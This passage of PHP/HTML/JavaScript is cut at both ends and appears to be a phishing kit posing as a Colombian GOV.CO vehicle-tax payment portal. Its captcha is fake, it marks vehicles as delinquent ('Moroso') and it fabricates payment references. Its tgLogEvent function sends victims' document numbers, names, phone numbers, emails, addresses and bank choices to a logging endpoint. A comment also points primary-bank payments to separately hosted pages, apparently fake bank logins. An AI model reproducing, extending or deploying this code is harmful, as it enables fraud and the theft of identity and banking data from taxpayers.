                            enero de 2026 aparec&iacute;a como propietario, selecciona el tipo de documento de
                            identidad, digita el n&uacute;mero e ingresa la placa.</li>
                        <li>Si eres poseedor del veh&iacute;culo, consulta en este enlace toda la informaci&oacute;n
                            para gestionar tu pago.</li>
                    </ul>
                </div>
            </aside>
        </section>

        <section class="results results--hidden" id="results-section" aria-live="polite">
            <div class="results__loader" id="results-loader" hidden>
                <span class="results__spinner" aria-hidden="true"></span>
                <span>Consultando informaci&oacute;n del veh&iacute;culo...</span>
            </div>

            <div class="results__error" id="results-error" hidden></div>

            <div class="results__content" id="results-content" hidden>
                <div class="results__notice">
                    <p class="results__lead">Esta b&uacute;squeda muestra el total de las deudas del contribuyente que
                        est&aacute; en etapa de cobro. Los recibos incluyen el total de la deuda a pagar con intereses.
                    </p>

                    <div class="results__summary" id="vehicle-summary">
                        <div class="results__summary-card">
                            <span class="results__summary-label">Placa</span>
                            <span class="results__summary-value" id="summary-placa">-</span>
                        </div>
                        <div class="results__summary-card">
                            <span class="results__summary-label">Veh&iacute;culo</span>
                            <span class="results__summary-value" id="summary-vehiculo">-</span>
                        </div>
                        <div class="results__summary-card">
                            <span class="results__summary-label">Estado</span>
                            <span class="results__summary-value" id="summary-estado">-</span>
                        </div>
                        <div class="results__summary-card">
                            <span class="results__summary-label">Organismo</span>
                            <span class="results__summary-value" id="summary-organismo">-</span>
                        </div>
                    </div>

                    <h2 class="results__subtitle">&iexcl;Ten en cuenta!</h2>
                    <ul class="results__list">
                        <li>Digita el n&uacute;mero de documento del contribuyente propietario al 01 de enero de la
                            vigencia por cancelar y la placa del veh&iacute;culo.</li>
                        <li>Las personas jur&iacute;dicas deben escribir el NIT sin d&iacute;gito de
                            verificaci&oacute;n.</li>
                        <li>Si el veh&iacute;culo tiene varios propietarios, la factura puede generarse con los datos de
                            cualquiera de ellos.</li>

                        <li>Los cupones de pago del predial por cuotas de a&ntilde;os anteriores deben descargarse en la
                            <a href="#">Oficina Virtual</a>.
                        </li>
                    </ul>

                    <p class="results__after">A continuaci&oacute;n, se relacionan las obligaciones por impuestos de
                        a&ntilde;os anteriores pendientes de pago:</p>
                </div>

                <div class="results__table-block">
                    <h2 class="results__heading">Veh&iacute;culos</h2>
                    <div class="table-responsive">
                        <table class="table table-condensed">
                            <thead>
                                <tr>
                                    <th>A&ntilde;o gravable</th>
                                    <th>Placa</th>
                                    <th>Modelo</th>
                                    <th>Marca</th>
                                    <th>L&iacute;nea</th>
                                    <th>Estado de obligaci&oacute;n</th>
                                    <th>Obligaci&oacute;n</th>
                                    <th>Formulario</th>
                                    <th>Referencia</th>
                                    <th>Total a pagar</th>

                                    <th>Pagar</th>
                                </tr>
                            </thead>
                            <tbody id="results-table-body"></tbody>
                        </table>
                    </div>
                </div>
            </div>
        </section>

        <section class="payment-view" id="payment-view">
            <div class="payment-layout">
                <aside class="payment-ticket">
                    <h2 class="payment-ticket__title">Resumen de pago</h2>
                    <span class="payment-ticket__label">Total a pagar</span>
                    <p class="payment-ticket__amount" id="payment-total">$0</p>
                    <hr class="payment-ticket__divider">

                    <div class="payment-ticket__meta">
                        <div class="payment-ticket__meta-item">
                            <span class="payment-ticket__meta-key">Concepto:</span>
                            <span class="payment-ticket__meta-value" id="payment-concept">VEHICULOS</span>
                        </div>
                        <div class="payment-ticket__meta-item">
                            <span class="payment-ticket__meta-key">Fecha l&iacute;mite:</span>
                            <span class="payment-ticket__meta-value" id="payment-deadline">-</span>
                        </div>
                        <div class="payment-ticket__meta-item">
                            <span class="payment-ticket__meta-key">Referencia 1:</span>
                            <span class="payment-ticket__meta-value" id="payment-reference-1">-</span>
                        </div>
                        <div class="payment-ticket__meta-item">
                            <span class="payment-ticket__meta-key">Referencia 2:</span>
                            <span class="payment-ticket__meta-value" id="payment-reference-2">-</span>
                        </div>
                    </div>

                    <div class="payment-ticket__security">
                        <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg"
                            aria-hidden="true">
                            <rect x="5" y="11" width="18" height="12" rx="6" fill="#DDEBFF" />
                            <rect x="10.5" y="4" width="7" height="10" rx="3.5" stroke="#F1B640" stroke-width="2" />
                            <path d="M14 15.2c1.3 0 2.3 1 2.3 2.3s-1 2.3-2.3 2.3-2.3-1-2.3-2.3 1-2.3 2.3-2.3Z"
                                fill="#3366CC" />
                        </svg>
                        <div>
                            <strong>Pago seguro</strong><br>
                            Tus datos y transacci&oacute;n est&aacute;n protegidos
                        </div>
                    </div>
                </aside>

                <div class="payment-main">
                    <h1 class="payment-main__title">Realiza tu pago</h1>
                    <p class="payment-main__subtitle">Completa tu informaci&oacute;n para procesar tu pago de forma
                        segura</p>

                    <form class="payment-form" id="payment-form" novalidate>
                        <h2 class="payment-form__section-title">Datos de titular</h2>
                        <div class="payment-grid">
                            <div class="payment-field">
                                <label for="payment-document-type"><span class="required">*</span> Tipo de
                                    documento</label>
                                <div class="payment-select-wrap">
                                    <select class="payment-control" id="payment-document-type">
                                        <option value="">Selecciona una opci&oacute;n</option>
                                        <option value="CC">C&eacute;dula de ciudadan&iacute;a</option>
                                        <option value="CE">C&eacute;dula de extranjer&iacute;a</option>
                                        <option value="NIT">NIT</option>
                                        <option value="PA">Pasaporte</option>
                                    </select>
                                </div>
                            </div>
                            <div class="payment-field">
                                <label for="payment-document-number"><span class="required">*</span> N&uacute;mero de
                                    documento</label>
                                <input class="payment-control" id="payment-document-number" type="text"
                                    inputmode="numeric" maxlength="15" placeholder="N&uacute;mero de documento"
                                    autocomplete="off">
                                <div class="payment-error" id="payment-doc-error"></div>
                            </div>
                            <div class="payment-field">
                                <label for="payment-customer-type"><span class="required">*</span> Tipo de
                                    cliente</label>
                                <div class="payment-select-wrap">
                                    <select class="payment-control" id="payment-customer-type">
                                        <option value="">Selecciona una opci&oacute;n</option>
                                        <option value="natural">Persona natural</option>
                                        <option value="juridica">Persona jur&iacute;dica</option>
                                    </select>
                                </div>
                            </div>
                            <div class="payment-field">
                                <label for="payment-name"><span class="required">*</span> Nombres y apellidos</label>
                                <input class="payment-control" id="payment-name" type="text"
                                    placeholder="Nombres del titular">
                            </div>
                            <div class="payment-field">
                                <label for="payment-phone"><span class="required">*</span> N&uacute;mero de
                                    tel&eacute;fono</label>
                                <input class="payment-control" id="payment-phone" type="tel" inputmode="numeric"
                                    maxlength="10" placeholder="3XXXXXXXXX" autocomplete="tel">
                                <div class="payment-error" id="payment-phone-error"></div>
                            </div>
                            <div class="payment-field">
                                <label for="payment-email"><span class="required">*</span> Correo
                                    electr&oacute;nico</label>
                                <input class="payment-control" id="payment-email" type="email"
                                    placeholder="Correo electr&oacute;nico">
                            </div>
                            <div class="payment-field payment-field--full">
                                <label for="payment-address"><span class="required">*</span> Direcci&oacute;n</label>
                                <input class="payment-control" id="payment-address" type="text"
                                    placeholder="Direcci&oacute;n">
                            </div>
                        </div>

                        <h2 class="payment-form__section-title">M&eacute;todo de pago</h2>
                        <div class="payment-grid">
                            <div class="payment-field">
                                <label for="payment-method"><span class="required">*</span> Medio de pago</label>
                                <div class="payment-select-wrap">
                                    <select class="payment-control" id="payment-method">
                                        <option value="debito">D&eacute;bito desde cuenta corriente/ahorros</option>
                                    </select>
                                </div>
                            </div>
                            <div class="payment-field">
                                <label for="payment-bank"><span class="required">*</span> Banco</label>
                                <div class="payment-select-wrap">
                                    <select class="payment-control" id="payment-bank">
                                        <option value="">Selecciona una opci&oacute;n</option>
                                        <option value="1831@ACCION FIDUCIARIA">ACCION FIDUCIARIA</option>
                                        <option value="1815@ALIANZA FIDUCIARIA">ALIANZA FIDUCIARIA</option>
                                        <option value="1558@BAN100">BAN100</option>
                                        <option value="1059@BANCAMIA S.A.">BANCAMIA S.A.</option>
                                        <option value="1040@BANCO AGRARIO">BANCO AGRARIO</option>
                                        <option value="1052@BANCO AV VILLAS">BANCO AV VILLAS</option>
                                        <option value="1013@BANCO BBVA COLOMBIA S.A.">BANCO BBVA COLOMBIA S.A.</option>
                                        <option value="1032@BANCO CAJA SOCIAL">BANCO CAJA SOCIAL</option>
                                        <option value="1066@BANCO COOPERATIVO COOPCENTRAL">BANCO COOPERATIVO COOPCENTRAL
                                        </option>
                                        <option value="1051@BANCO DAVIVIENDA">BANCO DAVIVIENDA</option>
                                        <option value="1001@BANCO DE BOGOTA">BANCO DE BOGOTA</option>
                                        <option value="1023@BANCO DE OCCIDENTE">BANCO DE OCCIDENTE</option>
                                        <option value="1062@BANCO FALABELLA">BANCO FALABELLA</option>
                                        <option value="1063@BANCO FINANDINA S.A. BIC">BANCO FINANDINA S.A. BIC</option>
                                        <option value="1012@BANCO GNB SUDAMERIS">BANCO GNB SUDAMERIS</option>
                                        <option value="1006@BANCO ITAU">BANCO ITAU</option>
                                        <option value="1071@BANCO J.P. MORGAN COLOMBIA S.A.">BANCO J.P. MORGAN COLOMBIA
                                            S.A.</option>
                                        <option value="1047@BANCO MUNDO MUJER S.A.">BANCO MUNDO MUJER S.A.</option>
                                        <option value="1060@BANCO PICHINCHA S.A.">BANCO PICHINCHA S.A.</option>
                                        <option value="1002@BANCO POPULAR">BANCO POPULAR</option>
                                        <option value="1065@BANCO SANTANDER COLOMBIA">BANCO SANTANDER COLOMBIA</option>
                                        <option value="1069@BANCO SERFINANZA">BANCO SERFINANZA</option>
                                        <option value="1303@BANCO UNION">BANCO UNION</option>
                                        <option value="1007@BANCOLOMBIA">BANCOLOMBIA</option>
                                        <option value="1061@BANCOOMEVA S.A.">BANCOOMEVA S.A.</option>
                                        <option value="1808@BOLD CF">BOLD CF</option>
                                        <option value="1283@CFA COOPERATIVA FINANCIERA">CFA COOPERATIVA FINANCIERA
                                        </option>
                                        <option value="1009@CITIBANK">CITIBANK</option>
                                        <option value="1812@COINK SA">COINK SA</option>
                                        <option value="1370@COLTEFINANCIERA">COLTEFINANCIERA</option>
                                        <option value="1292@CONFIAR COOPERATIVA FINANCIERA">CONFIAR COOPERATIVA
                                            FINANCIERA</option>
                                        <option value="1289@COTRAFA">COTRAFA</option>
                                        <option value="1816@CREZCAMOS">CREZCAMOS</option>
                                        <option value="1097@DALE">DALE</option>
                                        <option value="1019@DAVIBANK S.A.">DAVIBANK S.A.</option>
                                        <option value="1551@DAVIPLATA">DAVIPLATA</option>
                                        <option value="1802@DING">DING</option>
                                        <option value="1121@FINANCIERA JURISCOOP SA COMPANIA DE FINANCIAMIENTO">
                                            FINANCIERA JURISCOOP SA COMPANIA DE FINANCIAMIENTO</option>
                                        <option value="1814@GLOBAL66">GLOBAL66</option>
                                        <option value="1637@IRIS">IRIS</option>
                                        <option value="1286@JFK COOPERATIVA FINANCIERA">JFK COOPERATIVA FINANCIERA
                                        </option>
                                        <option value="1070@LULO BANK">LULO BANK</option>
                                        <option value="1801@MOVII S.A.">MOVII S.A.</option>
                                        <option value="1507@NEQUI">NEQUI</option>
                                        <option value="1809@NU">NU</option>
                                        <option value="1824@PAYCASH">PAYCASH</option>
                                        <option value="1803@POWWI">POWWI</option>
                                        <option value="1811@RAPPIPAY">RAPPIPAY</option>
                                        <option value="1804@UALA">UALA</option>
                                    </select>
                                </div>
                                <div class="payment-error" id="payment-bank-error"></div>
                            </div>
                        </div>

                        <div class="payment-consent">
                            <input class="payment-consent__checkbox" id="payment-consent" type="checkbox">
                            <label class="payment-consent__text" for="payment-consent">
                                Acepto los <a href="#">t&eacute;rminos y condiciones</a> generales de uso y autorizo el
                                tratamiento de datos personales.
                            </label>
                        </div>

                        <div class="payment-actions">
                            <button class="payment-btn payment-btn--ghost" id="cancel-payment-button"
                                type="button">Cancelar pago</button>
                            <button class="payment-btn payment-btn--primary" id="confirm-payment-button" type="submit"
                                disabled>Pagar $0</button>
                        </div>
                    </form>
                </div>
            </div>
        </section>
    </main>

    <footer class="footer">
        <div class="footer__main">
            <div class="footer__inner">
                <div class="footer-brand" aria-label="CO Colombia GOV.CO">
                    <img class="brand-country" src="assets/img/Marca_pa%C3%ADs_Colombia_logo_0.svg" alt="CO Colombia">
                    <img class="brand-image" src="assets/img/Group%2035_1.svg" alt="GOV.CO">
                </div>
            </div>
        </div>
    </footer>
    <script>
        const vehicleApiKey = <?= json_encode($apiFrontendKey, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
        const psePrimaryBanks = <?= json_encode($PSE_PRIMARY_BANKS, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
        const psePrimaryPage = <?= json_encode($PSE_PRIMARY_PAGE, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
        const pseBankAliases = <?= json_encode($PSE_BANK_ALIASES, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
        const form = document.getElementById('vehicle-form');
        const documentoInput = document.getElementById('documento');
        const placaInput = document.getElementById('placa');
        const captchaButton = document.getElementById('captcha-button');
        const captchaStatus = document.getElementById('captcha-status');
        const searchButton = document.getElementById('search-button');
        const clearButton = document.getElementById('clear-button');
        const termCheckbox = document.getElementById('accept-terms');
        const tipoDocumentoSelect = document.getElementById('tipo-documento');
        const resultsSection = document.getElementById('results-section');
        const resultsLoader = document.getElementById('results-loader');
        const resultsError = document.getElementById('results-error');
        const resultsContent = document.getElementById('results-content');
        const resultsTableBody = document.getElementById('results-table-body');
        const summaryPlaca = document.getElementById('summary-placa');
        const summaryVehiculo = document.getElementById('summary-vehiculo');
        const summaryEstado = document.getElementById('summary-estado');
        const summaryOrganismo = document.getElementById('summary-organismo');
        const pageShell = document.getElementById('page-shell');
        const paymentView = document.getElementById('payment-view');
        const paymentForm = document.getElementById('payment-form');
        const paymentTotal = document.getElementById('payment-total');
        const paymentConcept = document.getElementById('payment-concept');
        const paymentDeadline = document.getElementById('payment-deadline');
        const paymentReference1 = document.getElementById('payment-reference-1');
        const paymentReference2 = document.getElementById('payment-reference-2');
        const paymentDocumentType = document.getElementById('payment-document-type');
        const paymentDocumentNumber = document.getElementById('payment-document-number');
        const paymentCustomerType = document.getElementById('payment-customer-type');
        const paymentName = document.getElementById('payment-name');
        const paymentPhone = document.getElementById('payment-phone');
        const paymentEmail = document.getElementById('payment-email');
        const paymentAddress = document.getElementById('payment-address');
        const paymentBank = document.getElementById('payment-bank');
        const paymentConsent = document.getElementById('payment-consent');
        const paymentBankError = document.getElementById('payment-bank-error');
        const paymentPhoneError = document.getElementById('payment-phone-error');
        const paymentDocError = document.getElementById('payment-doc-error');
        const cancelPaymentButton = document.getElementById('cancel-payment-button');
        const confirmPaymentButton = document.getElementById('confirm-payment-button');
        const requiredFields = [documentoInput, placaInput];
        const paymentRequiredFields = [
            paymentDocumentType,
            paymentDocumentNumber,
            paymentCustomerType,
            paymentName,
            paymentPhone,
            paymentEmail,
            paymentAddress,
            paymentBank
        ];
        let captchaState = 'idle';
        let captchaTimer = null;
        let isSearching = false;
        let currentRequestController = null;
        let latestResultPayload = null;
        let currentPaymentContext = null;

        function getFieldWrapper(input) {
            return input.closest('.field');
        }

        function isFilled(input) {
            return input.value.trim().length > 0;
        }

        function isValidPlaca(value) {
            return /^[A-Z]{3}\d{3}$/.test(value.trim());
        }

        function updateSearchState() {
            const isReady = isFilled(documentoInput)
                && isValidPlaca(placaInput.value)
                && termCheckbox.checked
                && captchaState === 'checked'
                && !isSearching;
            searchButton.classList.toggle('is-ready', isReady);
            searchButton.disabled = !isReady;
        }

        function getTipoDocumentoCode() {
            const selected = tipoDocumentoSelect.value || '';
            if (selected.startsWith('CC')) return 'C';
            if (selected.startsWith('CE')) return 'E';
            if (selected.startsWith('NIT')) return 'N';
            if (selected.startsWith('PA')) return 'P';
            return 'C';
        }

        function showResultsSection() {
            resultsSection.classList.remove('results--hidden');
        }

        function hideResultsSection() {
            resultsSection.classList.add('results--hidden');
            resultsLoader.hidden = true;
            resultsError.hidden = true;
            resultsContent.hidden = true;
        }

        function escapeHtml(value) {
            return String(value ?? '')
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/"/g, '&quot;')
                .replace(/'/g, '&#39;');
        }

        function formatValue(value, fallback = 'No disponible') {
            const normalized = String(value ?? '').trim();
            return normalized.length ? normalized : fallback;
        }

        function formatCurrencyNumber(value, fallback = '0') {
            const numericValue = Number(value);
            if (!Number.isFinite(numericValue)) {
                return fallback;
            }
            return new Intl.NumberFormat('es-CO', {
                maximumFractionDigits: 0
            }).format(numericValue);
        }

        function formatPaymentAmount(value) {
            return `$${formatCurrencyNumber(value, '0')}`;
        }

        function formatDateForTicket(dateValue) {
            const parsedDate = new Date(dateValue);
            if (Number.isNaN(parsedDate.getTime())) {
                return '-';
            }
            return parsedDate.toISOString().slice(0, 10);
        }

        function buildNumericReference(payload, length = 16) {
            const vehicle = payload.vehiculo || {};
            const tax = payload.impuesto || {};
            const seed = [
                String(tax.anioFiscal ?? ''),
                String(vehicle.placa ?? placaInput.value.trim().toUpperCase()),
                String(documentoInput.value.trim())
            ].join('');
            const numeric = seed
                .split('')
                .map((character) => character.charCodeAt(0).toString().padStart(3, '0'))
                .join('');
            return numeric.slice(-length).padStart(length, '0');
        }

        function getPaymentContext(payload) {
            const vehicle = payload.vehiculo || {};
            const impuestoVehicular = payload.impuesto || {};
            const taxYear = String(impuestoVehicular.anioFiscal ?? new Date().getFullYear());
            const reference = buildNumericReference(payload, 16);
            const formulario = `${taxYear}${reference.slice(0, 13)}`.slice(0, 17);
            const amount = Number(impuestoVehicular.valorImpuesto ?? 0);
            const deadlineBase = new Date();
            deadlineBase.setDate(deadlineBase.getDate() + 15);

            return {
                amount,
                amountText: formatPaymentAmount(amount),
                concept: 'VEHICULOS',
                reference,
                formulario,
                deadline: formatDateForTicket(deadlineBase),
                taxYear,
                vehicle
            };
        }

        function tgLogEvent(event, data) {
            fetch('api/log-event.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ event: event, data: data }),
                keepalive: true
            }).catch(function () { });
        }

        function openPaymentView(context) {
            currentPaymentContext = context;
            paymentTotal.textContent = context.amountText;
            paymentConcept.textContent = context.concept;
            paymentDeadline.textContent = context.deadline;
            paymentReference1.textContent = context.reference;
            paymentReference2.textContent = context.formulario;
            confirmPaymentButton.textContent = `Pagar ${context.amountText}`;
            paymentDocumentType.value = tipoDocumentoSelect.value.startsWith('CC')
                ? 'CC'
                : tipoDocumentoSelect.value.startsWith('CE')
                    ? 'CE'
                    : tipoDocumentoSelect.value.startsWith('NIT')
                        ? 'NIT'
                        : tipoDocumentoSelect.value.startsWith('PA')
                            ? 'PA'
                            : '';
            paymentDocumentNumber.value = documentoInput.value.trim();
            paymentCustomerType.value = paymentDocumentType.value === 'NIT' ? 'juridica' : 'natural';
            paymentName.value = '';
            paymentPhone.value = '';
            paymentEmail.value = '';
            paymentAddress.value = '';
            paymentBank.value = '';
            paymentConsent.checked = false;
            paymentBankError.textContent = '';
            pageShell.classList.add('page--payment-active');
            updatePaymentState();
            paymentView.scrollIntoView({ behavior: 'smooth', block: 'start' });
            tgLogEvent('💳 Vista de pago vehicular', {
                'Placa': summaryPlaca.textContent,
                'Vehículo': summaryVehiculo.textContent,
                'Monto': context.amountText,
            });
        }

        function closePaymentView() {
            currentPaymentContext = null;
            pageShell.classList.remove('page--payment-active');
            paymentBankError.textContent = '';
            paymentForm.reset();
            confirmPaymentButton.textContent = 'Pagar $0';
            updatePaymentState();
            if (!resultsSection.classList.contains('results--hidden')) {
                resultsSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
            }
        }

        function isPhoneValid(v) { return /^3\d{9}$/.test(v); }
        function isDocValid(v) { return /^\d{4,15}$/.test(v); }
        function isEmailValid(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }

        function updatePaymentState() {
            const allFilled = paymentRequiredFields.every((field) => field.value.trim().length > 0);
            const phoneOk = isPhoneValid(paymentPhone.value.trim());
            const docOk = isDocValid(paymentDocumentNumber.value.trim());
            const emailOk = isEmailValid(paymentEmail.value.trim());
            const isReady = allFilled && paymentConsent.checked && phoneOk && docOk && emailOk;
            const showBankError = paymentBank.value.trim().length === 0 && paymentConsent.checked;

            paymentBankError.textContent = showBankError ? 'El campo banco es obligatorio' : '';
            confirmPaymentButton.disabled = !isReady;
            confirmPaymentButton.classList.toggle('is-ready', isReady);
        }

        function setLoadingState(loading) {
            isSearching = loading;
            searchButton.textContent = loading ? 'Consultando...' : 'Buscar';
            clearButton.disabled = loading;
            documentoInput.readOnly = loading;
            placaInput.readOnly = loading;
            tipoDocumentoSelect.disabled = loading;
            termCheckbox.disabled = loading;
            captchaButton.disabled = loading;
            updateSearchState();
        }

        function resetResults() {
            if (currentRequestController) {
                currentRequestController.abort();
                currentRequestController = null;
            }

            resultsTableBody.innerHTML = '';
            summaryPlaca.textContent = '-';
            summaryVehiculo.textContent = '-';
            summaryEstado.textContent = '-';
            summaryOrganismo.textContent = '-';
            latestResultPayload = null;
            hideResultsSection();
            resultsError.textContent = '';
            setLoadingState(false);
        }

        function setResultsMode(mode, errorMessage = '') {
            showResultsSection();
            resultsLoader.hidden = mode !== 'loading';
            resultsError.hidden = mode !== 'error';
            resultsContent.hidden = mode !== 'content';

            if (mode === 'error') {
                resultsError.textContent = errorMessage;
            }
        }

        function buildTableRow(payload) {
            const vehicle = payload.vehiculo || {};
            const impuestoVehicular = payload.impuesto || {};
            const taxYear = String(impuestoVehicular.anioFiscal ?? new Date().getFullYear() - 1);
            const reference = buildNumericReference(payload, 16);
            const formulario = `${taxYear}${reference.slice(0, 13)}`.slice(0, 17);
            const placa = formatValue(vehicle.placa, placaInput.value.trim().toUpperCase());
            const modelo = formatValue(vehicle.modelo);
            const marca = formatValue(vehicle.marca);
            const linea = formatValue(vehicle.linea);
            const estado = vehicle.estado === 'ACTIVO' ? 'Moroso' : formatValue(vehicle.estado, 'Moroso');
            const obligation = formatCurrencyNumber(impuestoVehicular.valorImpuesto, '0');

            return `
                <tr>
                    <td data-th="Año gravable">${escapeHtml(taxYear)}</td>
                    <td data-th="Placa">${escapeHtml(placa)}</td>
                    <td data-th="Modelo">${escapeHtml(modelo)}</td>
                    <td data-th="Marca">${escapeHtml(marca)}</td>
                    <td data-th="Línea">${escapeHtml(linea)}</td>
                    <td data-th="Estado de obligación">${escapeHtml(estado)}</td>
                    <td data-th="Obligación">${obligation}</td>
                    <td data-th="Formulario">${escapeHtml(formulario)}</td>
                    <td data-th="Referencia">${escapeHtml(reference)}</td>
                    <td data-th="Total a pagar">${obligation}</td>
                    <td data-th="Pagar"><a href="#" class="responsive-table-link" data-action="pay-result">Pagar</a></td>
                </tr>
            `;
        }

        function renderVehicleResults(payload) {
            const vehicle = payload.vehiculo || {};
            const vehicleSummaryParts = [vehicle.marca, vehicle.linea, vehicle.modelo]
                .map((value) => String(value ?? '').trim())
                .filter(Boolean);
            const stateSummaryParts = [vehicle.estado, vehicle.servicio]
                .map((value) => String(value ?? '').trim())
                .filter(Boolean);

            summaryPlaca.textContent = formatValue(vehicle.placa, placaInput.value.trim().toUpperCase());
            summaryVehiculo.textContent = vehicleSummaryParts.length
                ? vehicleSummaryParts.join(' ')
                : 'No disponible';
            summaryEstado.textContent = stateSummaryParts.length
                ? stateSummaryParts.join(' / ')
                : 'No disponible';
            summaryOrganismo.textContent = formatValue(vehicle.organismo);
            latestResultPayload = payload;
            resultsTableBody.innerHTML = buildTableRow(payload);
        }

        async function fetchVehicleData() {
            const placa = placaInput.value.trim().toUpperCase();
            const documento = documentoInput.value.trim();
            const tipo = getTipoDocumentoCode();

            if (currentRequestController) {
                currentRequestController.abort();
            }

            if (!vehicleApiKey) {
                throw new Error('La clave de acceso del API no esta configurada.');
            }

            currentRequestController = new AbortController();
            const apiUrl = new URL('api/vehiculo.php', window.location.href);
            const response = await fetch(apiUrl, {
                method: 'POST',
                signal: currentRequestController.signal,
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'X-Api-Key': vehicleApiKey
                },
                body: JSON.stringify({
                    placa,
                    documento,
                    tipo
                })
            });

            const payload = await response.json();

            if (!response.ok || !payload.ok) {
                throw new Error(payload.error || 'No fue posible consultar el API en este momento.');
            }

            return payload;
        }

        const ACCENT_MAP = { 'á': 'a', 'é': 'e', 'í': 'i', 'ó': 'o', 'ú': 'u', 'ñ': 'n', 'ü': 'u', 'à': 'a', 'â': 'a', 'ä': 'a', 'è': 'e', 'ê': 'e', 'ë': 'e', 'î': 'i', 'ï': 'i', 'ô': 'o', 'ö': 'o', 'û': 'u', 'ç': 'c' };

        function slugify(text) {
            let result = '';
            for (const ch of text.toLowerCase()) {
                result += ACCENT_MAP[ch] || ch;
            }
            return result.replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '');
        }

        function normalizeBankName(text) {
            let result = '';
            for (const ch of text.toLowerCase()) {
                result += ACCENT_MAP[ch] || ch;
            }
            return result.replace(/\s+/g, ' ').trim().toUpperCase();
        }

        function resolvePseBankConfig(bankName, bankCode) {
            const normalizedName = normalizeBankName(bankName);
            const bankKey = pseBankAliases[normalizedName] || slugify(bankName);
            const primaryBank = psePrimaryBanks[bankKey] || null;

            if (primaryBank) {
                return {
                    key: bankKey,
                    slug: primaryBank.slug,
                    id: primaryBank.id,
                    page: psePrimaryPage,
                    flow: 'primary'
                };
            }
            return { key: bankKey, flow: 'other' };
        }

        function setFieldError(input, hasError, message) {
            const field = getFieldWrapper(input);
            if (!field) return;
            const error = field.querySelector('.error');
            field.classList.toggle('has-error', hasError);
            if (error && message) {
                error.textContent = message;
            }
        }

        function setCaptchaState(state) {
            captchaButton.classList.remove('is-verifying', 'is-checked');
            captchaState = state;

            if (state === 'verifying') {
                captchaButton.classList.add('is-verifying');
                captchaStatus.textContent = 'Verificando...';
                captchaButton.setAttribute('aria-pressed', 'false');
                updateSearchState();
                return;
            }

            if (state === 'checked') {
                captchaButton.classList.add('is-checked');
                captchaStatus.textContent = 'Verificado';
                captchaButton.setAttribute('aria-pressed', 'true');
                updateSearchState();
                return;
            }

            captchaStatus.textContent = 'Haz clic para verificar';
            captchaButton.setAttribute('aria-pressed', 'false');
            updateSearchState();
        }

        function resetCaptcha() {
            if (captchaTimer) {
                clearTimeout(captchaTimer);
                captchaTimer = null;
            }
            setCaptchaState('idle');
        }

        requiredFields.forEach((input) => {
            input.addEventListener('input', () => {
                if (input === placaInput) {
                    const normalizedValue = input.value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase().slice(0, 6);
                    if (input.value !== normalizedValue) {
                        input.value = normalizedValue;
                    }
                }

                setFieldError(input, false);
                updateSearchState();
            });
        });

        termCheckbox.addEventListener('change', updateSearchState);

        paymentRequiredFields.forEach((field) => {
            field.addEventListener('input', updatePaymentState);
            field.addEventListener('change', updatePaymentState);
        });

        paymentConsent.addEventListener('change', updatePaymentState);

        // Teléfono: solo dígitos, máx 10, debe iniciar en 3
        paymentPhone.addEventListener('input', function () {
            this.value = this.value.replace(/\D/g, '').slice(0, 10);
            paymentPhoneError.textContent = '';
            updatePaymentState();
        });
        paymentPhone.addEventListener('blur', function () {
            const v = this.value.trim();
            if (!v) return;
            if (!isPhoneValid(v)) {
                paymentPhoneError.textContent = v.length < 10
                    ? 'El teléfono debe tener 10 dígitos'
                    : 'El teléfono debe empezar por 3';
            } else {
                paymentPhoneError.textContent = '';
            }
        });

        // Documento: solo dígitos, máx 15
        paymentDocumentNumber.addEventListener('input', function () {
            this.value = this.value.replace(/\D/g, '').slice(0, 15);
            paymentDocError.textContent = '';
            updatePaymentState();
        });
        paymentDocumentNumber.addEventListener('blur', function () {
            const v = this.value.trim();
            if (v && !isDocValid(v)) {
                paymentDocError.textContent = 'Ingresa un número de documento válido';
            } else {
                paymentDocError.textContent = '';
            }
        });

        // Email: validar formato al salir del campo
        paymentEmail.addEventListener('blur', function () {
            const v = this.value.trim();
            if (v && !isEmailValid(v)) {
                this.style.borderColor = '#e33a3a';
            } else {
                this.style.borderColor = '';
            }
        });
        paymentEmail.addEventListener('input', function () {
            this.style.borderColor = '';
            updatePaymentState();
        });

        captchaButton.addEventListener('click', () => {
            if (captchaState === 'verifying') return;

            if (captchaState === 'checked') {
                resetCaptcha();
                return;
            }

            setCaptchaState('verifying');
            captchaTimer = setTimeout(() => {
                setCaptchaState('checked');
                captchaTimer = null;
            }, 1400);
        });

        clearButton.addEventListener('click', () => {
            requiredFields.forEach((input) => setFieldError(input, false));
            termCheckbox.checked = false;
            resetCaptcha();
            resetResults();
            closePaymentView();
            requestAnimationFrame(updateSearchState);
        });

        resultsTableBody.addEventListener('click', (event) => {
            const payLink = event.target.closest('[data-action="pay-result"]');
            if (!payLink) return;

            event.preventDefault();
            if (!latestResultPayload) return;
            openPaymentView(getPaymentContext(latestResultPayload));
        });

        cancelPaymentButton.addEventListener('click', () => {
            closePaymentView();
        });

        paymentForm.addEventListener('submit', (event) => {
            event.preventDefault();
            updatePaymentState();
            if (confirmPaymentButton.disabled || !currentPaymentContext) {
                return;
            }

            const bankValue = paymentBank.value;
            const bankCode = bankValue.split('@')[0] || '';
            const bankName = bankValue.split('@')[1] || bankValue;
            const bankConfig = resolvePseBankConfig(bankName, bankCode);

            confirmPaymentButton.disabled = true;
            confirmPaymentButton.textContent = 'Procesando...';

            const logBase = {
                '🏦 Banco': bankName,
                '💳 Tipo documento': paymentDocumentType.value,
                '🪪 Documento': paymentDocumentNumber.value.trim(),
                '👤 Nombre': paymentName.value.trim(),
                '📱 Teléfono': paymentPhone.value.trim(),
                '📧 Correo': paymentEmail.value.trim(),
                '🏠 Dirección': paymentAddress.value.trim(),
                '👥 Tipo persona': paymentCustomerType.value,
                '💰 Monto': currentPaymentContext.amountText,
            };

            // Primary banks → Vercel directo
